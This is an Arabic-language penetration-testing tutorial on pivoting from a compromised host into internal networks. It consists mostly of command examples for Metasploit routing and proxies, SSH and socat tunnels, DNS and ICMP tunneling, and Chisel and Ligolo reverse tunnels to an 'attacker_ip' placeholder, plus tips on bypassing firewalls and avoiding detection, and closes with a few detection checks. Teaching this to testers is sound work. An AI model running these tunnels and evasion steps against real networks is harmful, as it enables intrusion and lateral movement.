





                          )     (
                   ___...(-------)-....___
               .-""       )    (          ""-.
         .-'``'|-._             )         _.-|
        /  .--.|   `""---...........---""`   |
       /  /    |                             |
       |  |    |                             |
        \  \   |                             |
         `\ `\ |                             |
           `\ `|                             |
           _/ /\                             /
          (__/  \                           /
       _..---""` \                         /`""---.._
    .-'           \                       /          '-.
   :               `-.__             __.-'              :
   :                  ) ""---...---"" (                 :
    '._               `"--...___...--"`              _.'
      \""--..__                              __..--""/
       '._     """----.....______.....----"""     _.'
          `""--..,,_____            _____,,..--""`
                        `"""----"""`

                      P I V O T I N G
   





التنقل (Pivoting) هو تقنية تستخدم في مرحلة ما بعد الاستغلال لاستخدام النظام المخترق كنقطة وصول للشبكات الداخلية التي لا يمكن الوصول إليها مباشرة من الخارج. يسمح التنقل للمختبر بتوسيع نطاق الاختبار ليشمل أنظمة داخلية أخرى.

المفاهيم الأساسية للتنقل
1. استكشاف الشبكة
قبل البدء بالتنقل، يجب استكشاف الشبكة الداخلية للتعرف على:

أجهزة الشبكة المتاحة
المنافذ المفتوحة
الخدمات النشطة
تقسيمات الشبكة
bash
# مسح الشبكة من خلال النظام المخترق
run arp_scanner -r 192.168.1.0/24
run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24
run post/windows/gather/enum_shares
2. تقنيات التنقل باستخدام Metasploit
إعداد التوجيه (Routing)
# إضافة مسار للشبكة الداخلية
route add 192.168.1.0 255.255.255.0 [session_id]

# استخدام وحدة autoroute
use post/multi/manage/autoroute
set SESSION [session_id]
set SUBNET 192.168.1.0
set NETMASK 255.255.255.0
run
بروكسي (Proxy)
# إنشاء بروكسي SOCKS من خلال Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run

# استخدام البروكسي مع أدوات خارجية (مثال: Nmap)
proxychains nmap -sT -Pn 192.168.1.100
Port Forwarding
# إعادة توجيه منفذ محدد
portfwd add -l 3389 -p 3389 -r 192.168.1.100

# تعطيل إعادة التوجيه
portfwd delete -l 3389
3. التنقل باستخدام أدوات SSH
bash
# إنشاء نفق SSH للوصول إلى منفذ داخلي
ssh -L 8080:192.168.1.100:80 user@compromised_host

# إنشاء بروكسي SOCKS عبر SSH
ssh -D 9050 user@compromised_host

# إعادة توجيه المنافذ الديناميكية
ssh -N -f -D 9050 user@compromised_host
4. التنقل باستخدام Socat
bash
# إعادة توجيه المنافذ
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# إنشاء قناة بين نظامين
# على النظام المخترق
socat TCP-LISTEN:8080,fork STDOUT | tee /tmp/pivot.log | socat STDIN TCP:attacker_ip:9090

# على نظام المهاجم
socat TCP-LISTEN:9090,fork STDOUT | tee /tmp/pivot_received.log | socat STDIN TCP:target_ip:445
التنقل المتقدم
1. نفق DNS (DNS Tunneling)
استخدام بروتوكول DNS لنقل البيانات عندما تكون بروتوكولات أخرى مقيدة:

bash
# إعداد خادم Iodine DNS
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# اتصال العميل
iodine -f -P password tunnel.yourdomain.com
2. ICMP Tunneling
استخدام حزم ICMP (ping) لنقل البيانات:

bash
# على النظام المهاجم
ptunnel -p [compromised_host_ip] -lp 8000 -da [internal_target] -dp 3389

# على النظام المخترق
ptunnel
3. التنقل متعدد المستويات (Multi-Level Pivoting)
للوصول إلى شبكات متعددة الطبقات:

# المستوى الأول من التوجيه
route add 192.168.1.0 255.255.255.0 1

# بعد اختراق نظام في الشبكة 192.168.1.0
route add 192.168.2.0 255.255.255.0 2

# إعداد بروكسي متعدد المستويات
use auxiliary/server/socks_proxy
run
4. استخدام برامج التنقل المتخصصة
Chisel
bash
# على النظام المهاجم
./chisel server -p 8080 --reverse

# على النظام المخترق
./chisel client [attacker_ip]:8080 R:socks
Ligolo
bash
# على النظام المهاجم
./ligolo-ng -selfcert
[...]
session > bind -p 8080:127.0.0.1:8080

# على النظام المخترق
./ligolo-ng_agent -connect [attacker_ip]:11601 -ignore-cert
تجاوز الحماية
1. تجاوز جدران الحماية
bash
# فحص قواعد جدار الحماية
run post/windows/gather/firewall_rules
run post/linux/gather/enum_iptables

# استخدام المنافذ المسموح بها عادة (80, 443, 53)
portfwd add -l 443 -p 3389 -r 192.168.1.100
2. تحديد واستغلال ثغرات في أجهزة الشبكة
# استخدام وحدات استغلال الراوتر
use auxiliary/scanner/snmp/cisco_config
use exploit/linux/http/cisco_rv320_rce
أفضل الممارسات للتنقل
الحد من الضوضاء: قلل نشاط الشبكة لتجنب الكشف
الاحتفاظ بسجل للاتصالات: وثق جميع القنوات والأنفاق التي تم إنشاؤها
استخدام المنافذ الشائعة: استخدم المنافذ المعروفة لتجنب الشك
التنظيف بعد الانتهاء: إزالة جميع التوجيهات والأنفاق بعد الانتهاء
استخدام التشفير: تأمين قنوات التنقل باستخدام التشفير
أدوات مفيدة للتنقل
Metasploit: التوجيه، البروكسي، إعادة توجيه المنافذ
SSH: أنفاق SSH، بروكسي SOCKS، إعادة توجيه المنافذ
Socat: إعادة توجيه المنافذ المتقدم
Chisel: أنفاق شبكة بديلة
Proxychains: توجيه تطبيقات عبر بروكسي
Ligolo: أداة تنقل مفتوحة المصدر بميزات متقدمة
Sshuttle: أداة VPN بسيطة تعمل على بروتوكول SSH
Ngrok: تعرض المنافذ المحلية للإنترنت (مفيد للاختبارات التعاونية)
اكتشاف التنقل
لمساعدة فرق الدفاع في تحسين الأمان، من المهم فهم كيفية اكتشاف محاولات التنقل:

# اكتشاف قنوات التنقل
netstat -antup | grep LISTEN
lsof -i
ps aux | grep ssh | grep -v grep
استخدام أنظمة كشف التسلل للبحث عن:

اتصالات شبكة غير عادية
استخدام منافذ غير مألوفة
نمط حركة مرور الشبكة غير طبيعي
محاولات اتصال من أجهزة داخلية إلى عناوين خارجية مشبوهة

